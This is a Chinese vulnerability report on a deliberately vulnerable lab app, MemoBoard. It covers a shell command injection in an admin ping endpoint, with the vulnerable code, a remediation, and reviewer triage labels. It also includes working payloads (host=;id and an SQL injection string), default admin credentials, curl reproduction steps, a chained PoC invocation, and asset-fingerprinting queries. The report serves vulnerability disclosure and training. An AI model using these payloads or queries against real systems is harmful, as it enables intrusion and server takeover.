## 摘要

MemoBoard 的运维 ping 接口 `GET /api/tools/ping` 存在命令注入漏洞。该接口需要 admin 会话，但 `host` 参数被直接拼接到 shell 命令 `echo MEMO-PING {host}` 中通过 `subprocess.getoutput` 执行，攻击者可通过分号注入任意命令实现 RCE。admin 凭据可通过同项目 SQLi 漏洞泄露，形成攻击链。

## 漏洞描述

MemoBoard 是一款基于 Flask 3.0.3 框架开发的内网备忘录看板应用。应用提供 `GET /api/tools/ping` 运维 ping 接口，仅限 admin 角色会话访问。该接口的 `host` 查询参数被直接拼接到 shell 命令字符串 `f"echo MEMO-PING {host}"` 中，通过 `subprocess.getoutput` 在 shell 中执行。攻击者可通过构造 `host=;id` 等注入 payload，利用 shell 分号分隔符执行任意系统命令，命令输出通过 HTTP 响应原样返回，实现远程代码执行（RCE）。

admin 会话可通过以下方式获取：
1. 利用 `GET /api/users` 的 SQL 注入漏洞拖取 admin 明文密码（admin123）
2. 使用种子数据默认凭据 admin/admin123 登录

## 漏洞危害

- **远程代码执行（RCE）**：攻击者可在服务器上执行任意系统命令，完全控制服务器。
- **攻击链串联**：SQLi 泄露 admin 密码 → 登录获取 admin 会话 → ping 接口命令注入 RCE，实现从匿名访问到完全控制服务器的攻击链。
- **可获取 OS-Shell**：通过命令注入可直接获取服务器 shell 访问权限。

## 漏洞厂商全称

MemoBoard（VulnHunter 白盒审计靶场项目）

## 已知受影响产品及版本

MemoBoard v0.5.0（board/__init__.py `__version__ = "0.5.0"`）

## 互联网资产证明
> 用于在公开资产测绘平台定位同类应用资产；优先使用应用自身稳定特征，不把漏洞路径、PoC 参数或一次性业务数据当作唯一指纹。测绘语句不允许出现「或」关系。

### 精准测绘语法

#### FOFA
```text
title="MemoBoard notes" && icon_hash="-151231234" && body="MemoBoard"
```

#### X 情报社区
```text
title="MemoBoard notes" && app="MemoBoard notes" && icon_hash="-151231234"
```

## 漏洞技术细节

### 入口

`GET /api/tools/ping?host=<payload>`（`src/app.py` 第 97-105 行）

```python
@app.get("/api/tools/ping")
def api_ping():
    if not session.get("name"):
        abort(401)
    if session.get("role") != "admin":
        abort(403)
    host = request.args.get("host", "127.0.0.1")
    return Response(ping_host(host), mimetype="text/plain")
```

### Sink

`board/engine.py` 第 77-79 行：

```python
def ping_host(host: str) -> str:
    # Host is interpolated into a shell command and the output is returned.
    return subprocess.getoutput(f"echo MEMO-PING {host}")
```

`host` 参数直接拼入 f-string shell 命令，通过 `subprocess.getoutput` 在 shell 中执行。`getoutput` 底层使用 `subprocess.run` + `shell=True`，支持 shell 元字符注入。

### 漏洞代码

- 完整路径：`src/board/engine.py:77`

```python
def ping_host(host: str) -> str:
    # Host is interpolated into a shell command and the output is returned.
    return subprocess.getoutput(f"echo MEMO-PING {host}")
```

### 攻击路径

1. （可选）利用 SQLi 漏洞 `GET /api/users?name=' OR 1=1 --` 获取 admin 密码
2. `POST /api/login` 用 admin/admin123 登录，获取 admin 会话 cookie
3. `GET /api/tools/ping?host=;id` — shell 执行 `echo MEMO-PING ;id`，分号后注入 `id` 命令
4. 响应正文包含 `id` 命令输出（uid/gid/groups）

## 同根因受影响点

- `src/board/engine.py:79` — `ping_host` 函数，`subprocess.getoutput` 拼接 shell 命令（主报告点）
- `src/app.py:97-105` — `api_ping` 路由，将用户可控的 `host` 参数传入 `ping_host` 并返回执行结果

## 复现证明

```bash
# 1. 登录获取 admin 会话

**产出时间**：2026-08-20 15:16:00

curl -c cookies.txt -X POST http://TARGET:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# 2. 命令注入 RCE
curl -b cookies.txt "http://TARGET:5000/api/tools/ping?host=;id"

# 预期响应:
# MEMO-PING 
# uid=0(root) gid=0(root) groups=0(root)

# 3. 使用 PoC 脚本（自动 SQLi 拖密码 → 登录 → RCE）
python poc.py -u http://TARGET:5000 -c id
```

## 修复方案

1. 使用 `subprocess.run` 配合参数列表（`shell=False`），避免 shell 拼接：
```python
import shlex, subprocess
def ping_host(host: str) -> str:
    result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=5)
    return result.stdout
```
2. 对 `host` 参数进行严格白名单校验（仅允许 IP/域名格式）。
3. 如必须用 `echo`，使用参数列表形式：`subprocess.run(["echo", f"MEMO-PING {host}"], ...)`。

## 备注

此漏洞与 SQLi 漏洞（`GET /api/users` 字符串拼接 SQL）可串联为攻击链：SQLi 泄露 admin 密码 → 登录获取 admin 会话 → ping 接口命令注入 RCE。admin 凭据也可通过种子数据默认凭据 admin/admin123 直接获取。

---

## 审核标注

- 攻击面：后台
- 所需账号：管理员
- 配置前提：默认配置
- 严重度：高危（high）
- 校准得分：3
- 可达性：管理员权限才可达
- 影响范围：RCE/全库读取/完整控制
- 利用复杂度：单请求或简单触发
- 防护状态：无有效防护
- 价值分层：有 CVE 价值（cve_candidate）
- 分层理由：Authenticated admin can inject shell metacharacters into the ping host parameter, achieving full RCE with command output echoed back in the HTTP response. The admin session is obtainable via the unauthenticated SQLi on /api/users (chained attack), making this reachable from anonymous access. Classic command injection with clear RCE impact — CVE-worthy.
- 根因合并键：rce:ping_host
